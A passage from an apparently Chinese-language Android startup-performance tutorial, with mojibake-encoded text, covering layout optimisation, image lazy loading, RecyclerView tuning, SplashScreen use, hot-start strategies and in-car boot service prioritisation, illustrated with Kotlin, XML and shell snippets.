<p><strong>ä½¿ç”¨ViewStubå»¶è¿ŸåŠ è½½</strong>:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- activity_main.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">...</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- é¦–å±å¯è§çš„å†…å®¹ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span> <span class="hljs-attr">...</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">RecyclerView</span> <span class="hljs-attr">...</span> /&gt;</span>

    <span class="hljs-comment">&lt;!-- éé¦–å±å†…å®¹ä½¿ç”¨ViewStubå»¶è¿ŸåŠ è½½ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ViewStub</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/stub_detail_panel"</span>
        <span class="hljs-attr">android:layout</span>=<span class="hljs-string">"@layout/layout_detail_panel"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span> /&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">ViewStub</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/stub_comment_section"</span>
        <span class="hljs-attr">android:layout</span>=<span class="hljs-string">"@layout/layout_comment_section"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// éœ€è¦æ—¶æ‰åŠ è½½</span>
findViewById&lt;ViewStub&gt;(R.id.stub_detail_panel).inflate()
</code></pre>
<p><strong>ä½¿ç”¨ConstraintLayoutå‡å°‘å±‚çº§</strong>:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- ä¼˜åŒ–å‰: åµŒå¥—5å±‚ (measure/layoutè€—æ—¶150ms) --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">RelativeLayout</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">RelativeLayout</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span>

<span class="hljs-comment">&lt;!-- ä¼˜åŒ–å: åªæœ‰2å±‚ (measure/layoutè€—æ—¶50ms) --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ConstraintLayout</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span>
        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span>
        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ConstraintLayout</span>&gt;</span>
</code></pre>
<p><strong>å¼‚æ­¥Inflateå¸ƒå±€</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å¯¹äºå¤æ‚å¸ƒå±€,ä½¿ç”¨AsyncLayoutInflaterå¼‚æ­¥åŠ è½½</span>
AsyncLayoutInflater(<span class="hljs-keyword">this</span>).inflate(R.layout.complex_layout, container) { view, resid, parent -&gt;
    <span class="hljs-comment">// åœ¨ä¸»çº¿ç¨‹å›è°ƒ,æ·»åŠ åˆ°å®¹å™¨</span>
    parent?.addView(view)
}
</code></pre>
<h4 data-id="heading-42">ä¼˜åŒ–ç­–ç•¥4: å›¾ç‰‡ä¼˜åŒ–</h4>
<p><strong>æ‡’åŠ è½½å›¾ç‰‡</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä½¿ç”¨Coil/Glideçš„å ä½ç¬¦å’Œæ‡’åŠ è½½</span>
imageView.load(<span class="hljs-string">"https://example.com/image.jpg"</span>) {
    placeholder(R.drawable.placeholder)  <span class="hljs-comment">// å…ˆæ˜¾ç¤ºå ä½å›¾</span>
    crossfade(<span class="hljs-literal">true</span>)  <span class="hljs-comment">// æ·¡å…¥æ·¡å‡º</span>
    memoryCacheKey(<span class="hljs-string">"user_avatar_<span class="hljs-subst">${userId}</span>"</span>)  <span class="hljs-comment">// å†…å­˜ç¼“å­˜</span>
}
</code></pre>
<p><strong>åªåŠ è½½å¯è§åŒºåŸŸçš„å›¾ç‰‡</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// RecyclerViewåªåŠ è½½å¯è§Itemçš„å›¾ç‰‡</span>
recyclerView.addOnScrollListener(<span class="hljs-keyword">object</span> : RecyclerView.OnScrollListener() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onScrollStateChanged</span><span class="hljs-params">(recyclerView: <span class="hljs-type">RecyclerView</span>, newState: <span class="hljs-type">Int</span>)</span></span> {
        <span class="hljs-keyword">when</span> (newState) {
            RecyclerView.SCROLL_STATE_IDLE -&gt; {
                <span class="hljs-comment">// åœæ­¢æ»šåŠ¨æ—¶æ‰åŠ è½½å›¾ç‰‡</span>
                Glide.with(context).resumeRequests()
            }
            <span class="hljs-keyword">else</span> -&gt; {
                <span class="hljs-comment">// æ»šåŠ¨ä¸­æš‚åœåŠ è½½</span>
                Glide.with(context).pauseRequests()
            }
        }
    }
})
</code></pre>
<p><strong>ä½¿ç”¨WebPæ ¼å¼</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°†PNG/JPGè½¬æ¢ä¸ºWebP (å‡å°30-50%æ–‡ä»¶å¤§å°)</span>
cwebp input.png -q 80 -o output.webp
</code></pre>
<h3 data-id="heading-43">3.4 é¦–å±æ¸²æŸ“ä¼˜åŒ–</h3>
<p>é¦–å±æ¸²æŸ“æ˜¯ç”¨æˆ·æ„ŸçŸ¥å¯åŠ¨å®Œæˆçš„å…³é”®æ—¶åˆ»ã€‚</p>
<h4 data-id="heading-44">æµ‹é‡é¦–å±æ¸²æŸ“æ—¶é—´</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">val</span> startTime = System.currentTimeMillis()
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        <span class="hljs-comment">// ç›‘å¬é¦–å¸§ç»˜åˆ¶å®Œæˆ</span>
        window.decorView.post {
            <span class="hljs-keyword">val</span> renderTime = System.currentTimeMillis() - startTime
            Log.d(<span class="hljs-string">"Performance"</span>, <span class="hljs-string">"é¦–å±æ¸²æŸ“è€—æ—¶: <span class="hljs-subst">${renderTime}</span>ms"</span>)

            <span class="hljs-comment">// ä¸ŠæŠ¥ç»™åˆ†æå¹³å°</span>
            Analytics.track(<span class="hljs-string">"first_screen_render"</span>, mapOf(<span class="hljs-string">"duration"</span> to renderTime))
        }
    }
}
</code></pre>
<h4 data-id="heading-45">ä¼˜åŒ–RecyclerViewé¦–å±åŠ è½½</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä¼˜åŒ–RecyclerViewæ€§èƒ½</span>
recyclerView.apply {
    <span class="hljs-comment">// 1. è®¾ç½®å›ºå®šå¤§å° (è·³è¿‡measure)</span>
    setHasFixedSize(<span class="hljs-literal">true</span>)

    <span class="hljs-comment">// 2. å¢åŠ Viewç¼“å­˜</span>
    setItemViewCacheSize(<span class="hljs-number">20</span>)  <span class="hljs-comment">// é»˜è®¤2,å¢åŠ åˆ°20</span>
    recycledViewPool.setMaxRecycledViews(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>)

    <span class="hljs-comment">// 3. é¢„å– (prefetch)</span>
    (layoutManager <span class="hljs-keyword">as</span>? LinearLayoutManager)?.apply {
        isItemPrefetchEnabled = <span class="hljs-literal">true</span>
        initialPrefetchItemCount = <span class="hljs-number">4</span>
    }

    <span class="hljs-comment">// 4. ä½¿ç”¨DiffUtilå¢é‡æ›´æ–°</span>
    adapter = MyAdapter().apply {
        submitList(dataList)
    }
}
</code></pre>
<h4 data-id="heading-46">ä½¿ç”¨å¯åŠ¨çª—å£ (SplashScreen API)</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- themes.xml --&gt;</span>
<span class="hljs-comment">&lt;!-- å®šä¹‰å¯åŠ¨ä¸»é¢˜,æ˜¾ç¤ºè‡ªå®šä¹‰èƒŒæ™¯ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"AppTheme.Launcher"</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">"Theme.SplashScreen"</span>&gt;</span><span class="xml">
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"windowSplashScreenBackground"</span>&gt;</span>@color/splash_background<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"windowSplashScreenAnimatedIcon"</span>&gt;</span>@drawable/ic_launcher<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"postSplashScreenTheme"</span>&gt;</span>@style/AppTheme<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- AndroidManifest.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">activity</span>
    <span class="hljs-attr">android:name</span>=<span class="hljs-string">".MainActivity"</span>
    <span class="hljs-attr">android:theme</span>=<span class="hljs-string">"@style/AppTheme.Launcher"</span>
    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">"true"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.MAIN"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.category.LAUNCHER"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MainActivity.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-comment">// å®‰è£…SplashScreen</span>
        <span class="hljs-keyword">val</span> splashScreen = installSplashScreen()

        <span class="hljs-comment">// ä¿æŒSplashScreenç›´åˆ°æ•°æ®å‡†å¤‡å¥½</span>
        <span class="hljs-keyword">var</span> isReady = <span class="hljs-literal">false</span>
        splashScreen.setKeepOnScreenCondition { !isReady }

        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        <span class="hljs-comment">// å¼‚æ­¥åŠ è½½æ•°æ®</span>
        lifecycleScope.launch {
            loadData()
            isReady = <span class="hljs-literal">true</span>  <span class="hljs-comment">// æ•°æ®å‡†å¤‡å¥½,ç§»é™¤SplashScreen</span>
        }
    }
}
</code></pre>
<p><strong>Activityä¼˜åŒ–æ•ˆæœå¯¹æ¯”</strong>:</p>















































<table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="right">Activity+æ¸²æŸ“è€—æ—¶</th><th align="right">æ€»å¯åŠ¨æ—¶é—´</th><th align="right">ä¼˜åŒ–å¹…åº¦</th></tr></thead><tbody><tr><td align="left">åŸå§‹æ–¹æ¡ˆ</td><td align="right">1400ms</td><td align="right">1580ms</td><td align="right">-</td></tr><tr><td align="left">å¼‚æ­¥åŠ è½½</td><td align="right">80ms</td><td align="right">260ms</td><td align="right">â¬‡ï¸ 84%</td></tr><tr><td align="left">æ•°æ®é¢„åŠ è½½</td><td align="right">80ms</td><td align="right">260ms</td><td align="right">â¬‡ï¸ 84%</td></tr><tr><td align="left">å¸ƒå±€ä¼˜åŒ–</td><td align="right">50ms</td><td align="right">230ms</td><td align="right">â¬‡ï¸ 85%</td></tr><tr><td align="left">å›¾ç‰‡ä¼˜åŒ–</td><td align="right">80ms</td><td align="right">260ms</td><td align="right">â¬‡ï¸ 84%</td></tr><tr><td align="left"><strong>ç»¼åˆä¼˜åŒ–</strong></td><td align="right"><strong>50ms</strong></td><td align="right"><strong>230ms</strong></td><td align="right"><strong>â¬‡ï¸ 85%</strong></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-47">å››ã€Appçƒ­å¯åŠ¨ä¼˜åŒ–:æ¯«ç§’çº§çš„ç”¨æˆ·ä½“éªŒ</h2>
<p>çƒ­å¯åŠ¨æ˜¯Appä»åå°æ¢å¤çš„åœºæ™¯,è™½ç„¶æ¯”å†·å¯åŠ¨å¿«,ä½†ä¼˜åŒ–ä¸å½“ä»ä¼šè®©ç”¨æˆ·æ„Ÿåˆ°å¡é¡¿ã€‚</p>
<h3 data-id="heading-48">4.1 çƒ­å¯åŠ¨æ€§èƒ½æµ‹é‡</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æµ‹é‡çƒ­å¯åŠ¨æ—¶é—´</span>
<span class="hljs-comment"># 1. å¯åŠ¨App</span>
adb shell am start-activity com.example.myapp/.MainActivity

<span class="hljs-comment"># 2. æŒ‰Homeé”®(Appè¿›å…¥åå°)</span>
adb shell input keyevent KEYCODE_HOME

<span class="hljs-comment"># 3. ç­‰å¾…2ç§’</span>

<span class="hljs-comment"># 4. é‡æ–°å¯åŠ¨Appå¹¶æµ‹é‡</span>
adb shell am start-activity -W com.example.myapp/.MainActivity

<span class="hljs-comment"># è¾“å‡º:</span>
<span class="hljs-comment"># TotalTime: 450ms  â† è¿™å°±æ˜¯çƒ­å¯åŠ¨æ—¶é—´</span>
</code></pre>
<h3 data-id="heading-49">4.2 çƒ­å¯åŠ¨ä¼˜åŒ–ç­–ç•¥</h3>
<h4 data-id="heading-50">ç­–ç•¥1: é¿å…onResume()ä¸­çš„é‡å¤æ“ä½œ</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ ä¸å¥½çš„åšæ³•</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onResume</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onResume()

        <span class="hljs-comment">// æ¯æ¬¡onResumeéƒ½æ‰§è¡Œ,åŒ…æ‹¬çƒ­å¯åŠ¨</span>
        loadUserInfo()       <span class="hljs-comment">// 400ms</span>
        loadProductList()    <span class="hljs-comment">// 300ms</span>
        updateUI()          <span class="hljs-comment">// 100ms</span>

        <span class="hljs-comment">// çƒ­å¯åŠ¨è€—æ—¶: 800ms (å¤ªæ…¢!)</span>
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… å¥½çš„åšæ³•: åŒºåˆ†é¦–æ¬¡å’Œåç»­Resume</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isFirstResume = <span class="hljs-literal">true</span>

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onResume</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onResume()

        <span class="hljs-keyword">if</span> (isFirstResume) {
            <span class="hljs-comment">// é¦–æ¬¡Resume: åŠ è½½æ‰€æœ‰æ•°æ®</span>
            loadUserInfo()
            loadProductList()
            updateUI()
            isFirstResume = <span class="hljs-literal">false</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// çƒ­å¯åŠ¨: åªåˆ·æ–°å¿…è¦æ•°æ®</span>
            refreshData()  <span class="hljs-comment">// åªåˆ·æ–°æ—¶é—´æ•æ„Ÿçš„æ•°æ®,å¦‚æ¶ˆæ¯æ•°ã€é€šçŸ¥ç­‰</span>
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">refreshData</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// åªåˆ·æ–°å¢é‡æ•°æ®,è€—æ—¶50ms</span>
        lifecycleScope.launch {
            <span class="hljs-keyword">val</span> newMessages = withContext(Dispatchers.IO) {
                MessageApi.getNewMessages()
            }
            updateMessageBadge(newMessages)
        }
    }
}
</code></pre>
<h4 data-id="heading-51">ç­–ç•¥2: ç¼“å­˜ViewçŠ¶æ€</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä¿å­˜å’Œæ¢å¤æ»šåŠ¨ä½ç½®</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> scrollPosition = <span class="hljs-number">0</span>

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSaveInstanceState</span><span class="hljs-params">(outState: <span class="hljs-type">Bundle</span>)</span></span> {
        <span class="hljs-keyword">super</span>.onSaveInstanceState(outState)
        <span class="hljs-comment">// ä¿å­˜æ»šåŠ¨ä½ç½®</span>
        scrollPosition = recyclerView.computeVerticalScrollOffset()
        outState.putInt(<span class="hljs-string">"scroll_position"</span>, scrollPosition)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onRestoreInstanceState</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>)</span></span> {
        <span class="hljs-keyword">super</span>.onRestoreInstanceState(savedInstanceState)
        <span class="hljs-comment">// æ¢å¤æ»šåŠ¨ä½ç½®</span>
        scrollPosition = savedInstanceState.getInt(<span class="hljs-string">"scroll_position"</span>, <span class="hljs-number">0</span>)
        recyclerView.post {
            recyclerView.scrollBy(<span class="hljs-number">0</span>, scrollPosition)
        }
    }
}
</code></pre>
<h4 data-id="heading-52">ç­–ç•¥3: ä½¿ç”¨Fragmentç¼“å­˜</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ViewPager2ç¼“å­˜Fragment,é¿å…é‡å¤åˆ›å»º</span>
viewPager.offscreenPageLimit = <span class="hljs-number">2</span>  <span class="hljs-comment">// ç¼“å­˜å·¦å³å„2é¡µ</span>

<span class="hljs-comment">// FragmentManagerå¤ç”¨Fragment</span>
supportFragmentManager.beginTransaction()
    .replace(R.id.container, fragment, <span class="hljs-string">"tag"</span>)
    .commit()

<span class="hljs-comment">// ä¸‹æ¬¡ä½¿ç”¨æ—¶å…ˆæŸ¥æ‰¾ç¼“å­˜</span>
<span class="hljs-keyword">val</span> cachedFragment = supportFragmentManager.findFragmentByTag(<span class="hljs-string">"tag"</span>)
<span class="hljs-keyword">if</span> (cachedFragment != <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// å¤ç”¨ç¼“å­˜çš„Fragment</span>
    supportFragmentManager.beginTransaction()
        .show(cachedFragment)
        .commit()
} <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// åˆ›å»ºæ–°Fragment</span>
}
</code></pre>
<p><strong>çƒ­å¯åŠ¨ä¼˜åŒ–æ•ˆæœ</strong>:</p>



































<table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="right">çƒ­å¯åŠ¨è€—æ—¶</th><th align="right">ä¼˜åŒ–å¹…åº¦</th><th align="left">ç”¨æˆ·ä½“éªŒ</th></tr></thead><tbody><tr><td align="left">åŸå§‹æ–¹æ¡ˆ</td><td align="right">800ms</td><td align="right">-</td><td align="left">æ˜æ˜¾å¡é¡¿</td></tr><tr><td align="left">é¿å…é‡å¤æ“ä½œ</td><td align="right">300ms</td><td align="right">â¬‡ï¸ 62.5%</td><td align="left">è½»å¾®å»¶è¿Ÿ</td></tr><tr><td align="left">ç¼“å­˜ViewçŠ¶æ€</td><td align="right">250ms</td><td align="right">â¬‡ï¸ 68.75%</td><td align="left">å‡ ä¹æ— æ„ŸçŸ¥</td></tr><tr><td align="left">Fragmentç¼“å­˜</td><td align="right">200ms</td><td align="right">â¬‡ï¸ 75%</td><td align="left">å³æ—¶å“åº”</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-53">äº”ã€è½¦æœºåœºæ™¯ç‰¹æ®Šä¼˜åŒ–</h2>
<p>è½¦è½½ç³»ç»Ÿå¯¹å¯åŠ¨æ€§èƒ½è¦æ±‚æ›´é«˜,åŒæ—¶æœ‰ç‰¹æ®Šçš„çº¦æŸæ¡ä»¶ã€‚</p>
<h3 data-id="heading-54">5.1 è½¦æœºBootä¼˜åŒ–ç‰¹ç‚¹</h3>
<p><strong>æŒ‘æˆ˜</strong>:</p>
<ul>
<li>å¯åŠ¨æ—¶é—´è¦æ±‚æ›´ä¸¥æ ¼ (&lt; 10ç§’åˆ°Launcher,&lt; 5ç§’åˆ°å€’è½¦å½±åƒ)</li>
<li>ç¡¬ä»¶èµ„æºç›¸å¯¹å—é™ (CPUã€RAMæ¯”æ——èˆ°æ‰‹æœºä½)</li>
<li>å®‰å…¨å…³é”®åŠŸèƒ½å¿…é¡»å¿«é€Ÿå¯ç”¨ (å€’è½¦å½±åƒã€èƒå‹ç›‘æµ‹)</li>
</ul>
<p><strong>ä¼˜åŒ–ç­–ç•¥</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># init.rc: å…³é”®æœåŠ¡ä¼˜å…ˆå¯åŠ¨</span>
on boot
    <span class="hljs-comment"># ä¼˜å…ˆçº§1: å€’è½¦å½±åƒç›¸å…³ (å¿…é¡»3ç§’å†…å¯ç”¨)</span>
    start camera_hal
    start rvc_service  <span class="hljs-comment"># Rear View Camera</span>

    <span class="hljs-comment"># ä¼˜å…ˆçº§2: ä»ªè¡¨æ˜¾ç¤º</span>
    start instrument_cluster

    <span class="hljs-comment"># ä¼˜å…ˆçº§3: å…¶ä»–åŠŸèƒ½ (å»¶åå¯åŠ¨)</span>
    <span class="hljs-built_in">exec</span> - root -- /system/bin/sh -c <span class="hljs-string">"start media_service &amp;"</span>
    <span class="hljs-built_in">exec</span> - root -- /system/bin/sh -c <span class="hljs-string">"start navi_service &amp;"</span>
</code></pre>
<h3 data-id="heading-55">5.2 è½¦æœºAppå¯åŠ¨ä¼˜åŒ–</h3>
<p><strong>Launcheré¢„åŠ è½½å¸¸ç”¨App</strong>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CarLauncher</span> : <span class="hljs-type">Activity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_launcher)

        <span class="hljs-comment">// åœ¨Launcheræ˜¾ç¤ºå,åå°é¢„åŠ è½½å¯¼èˆªå’ŒéŸ³ä¹App</span>
        window.decorView.post {
            preloadApp(<span class="hljs-string">"com.example.navi"</span>)
            preloadApp(<span class="hljs-string">"com.example.music"</span>)
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">preloadApp</span><span class="hljs-params">(packageName: <span class="hljs-type">String</span>)</span></span> {
        Thread {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// å¯åŠ¨Appä½†ä¸æ˜¾ç¤º</span>
                <span class="hljs-keyword">val</span> intent = packageManager.getLaunchIntentForPackage(packageName)
                intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)

                <span class="hljs-comment">// å»¶è¿Ÿ1ç§’åç§»åˆ°åå° (è¿›ç¨‹å·²åˆ›å»º,ä¸‹æ¬¡å¯åŠ¨æ›´å¿«)</span>
                Thread.sleep(<span class="hljs-number">1000</span>)

                <span class="hljs-keyword">val</span> am = getSystemService(Context.ACTIVITY_SERVICE) <span class="hljs-keyword">as</span> ActivityManager
                am.moveTaskToBack(<span class="hljs-literal">true</span>)
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                Log.e(<span class="hljs-string">"Preload"</span>, <span class="hljs-string">"é¢„åŠ è½½å¤±è´¥: <span class="hljs-variable">$packageName</span>"</span>, e)
            }
        }.start()
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-56">å…­ã€æ€»ç»“ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-57">6.1 å¯åŠ¨ä¼˜åŒ–æ–¹æ³•è®º</h3>
<p>âœ… <strong>1. æµ‹é‡ä¼˜å…ˆ,æ•°æ®é©±åŠ¨</strong></p>
<ul>
<li>ä¸è¦å‡­æ„Ÿè§‰ä¼˜åŒ–,å…ˆç”¨Systrace/Perfettoç²¾ç¡®æµ‹é‡</li>
<li>æ‰¾åˆ°çœŸæ­£çš„ç“¶é¢ˆ,è€Œéæƒ³è±¡ä¸­çš„ç“¶é¢ˆ</li>
<li>ä¼˜åŒ–å‰åéƒ½è¦æµ‹é‡,éªŒè¯æ•ˆæœ</li>
</ul>
<p>âœ… <strong>2. åˆ†é˜¶æ®µä¼˜åŒ–</strong></p>
<ul>
<li>Applicationé˜¶æ®µ: å»¶è¿Ÿåˆå§‹åŒ–ã€å¼‚æ­¥åˆå§‹åŒ–ã€æ‡’åŠ è½½</li>
<li>Activityé˜¶æ®µ: å¼‚æ­¥åŠ è½½æ•°æ®ã€é¢„åŠ è½½ã€éª¨æ¶å±</li>
<li>é¦–å±æ¸²æŸ“: å¸ƒå±€ä¼˜åŒ–ã€å›¾ç‰‡æ‡’åŠ è½½ã€RecyclerViewä¼˜åŒ–</li>
</ul>
<p>âœ… <strong>3. å¼‚æ­¥ä¸ºç‹</strong></p>
<ul>
<li>èƒ½å¼‚æ­¥çš„åšå†³ä¸åŒæ­¥</li>
<li>ä¸»çº¿ç¨‹åªåšUIç›¸å…³æ“ä½œ</li>
<li>ä½¿ç”¨Coroutines/RxJavaç®¡ç†å¼‚æ­¥ä»»åŠ¡</li>
</ul>
<p>âœ… <strong>4. å»¶è¿ŸåŠ è½½</strong></p>
<ul>
<li>éå¿…é¡»çš„åŠŸèƒ½å»¶ååˆå§‹åŒ–</li>
<li>éé¦–å±çš„å†…å®¹å»¶ååŠ è½½</li>
<li>ä½¿ç”¨IdleHandlerã€postDelayedã€lazyç­‰æœºåˆ¶</li>
</ul>
<p>âœ… <strong>5. æŒç»­ç›‘æ§</strong></p>
<ul>
<li>å»ºç«‹CI/CDè‡ªåŠ¨åŒ–æµ‹è¯•</li>
<li>çº¿ä¸Šç›‘æ§å¯åŠ¨æ€§èƒ½</li>
<li>è®¾ç½®æ€§èƒ½é˜ˆå€¼,é˜²æ­¢å€’é€€</li>
</ul>
<h3 data-id="heading-58">6.2 é¿å‘æŒ‡å—</h3>
<p>âŒ <strong>ä¸è¦åœ¨Applicationä¸­åšå¤ªå¤šäº‹æƒ…</strong></p>
<ul>
<li>Application.onCreate()åªåˆå§‹åŒ–å´©æºƒä¸ŠæŠ¥ç­‰å¿…é¡»çš„æœåŠ¡</li>
<li>å…¶ä»–SDKå¼‚æ­¥æˆ–å»¶è¿Ÿåˆå§‹åŒ–</li>
</ul>
<p>âŒ <strong>ä¸è¦åœ¨ä¸»çº¿ç¨‹åšç½‘ç»œè¯·æ±‚å’Œæ•°æ®åº“æ“ä½œ</strong></p>
<ul>
<li>æ°¸è¿œä¸è¦åœ¨ä¸»çº¿ç¨‹åšè€—æ—¶æ“ä½œ</li>
<li>ä½¿ç”¨Coroutinesçš„Dispatchers.IO</li>
</ul>
<p>âŒ <strong>ä¸è¦è¿‡æ—©åˆå§‹åŒ–ä¸éœ€è¦çš„SDK</strong></p>
<ul>
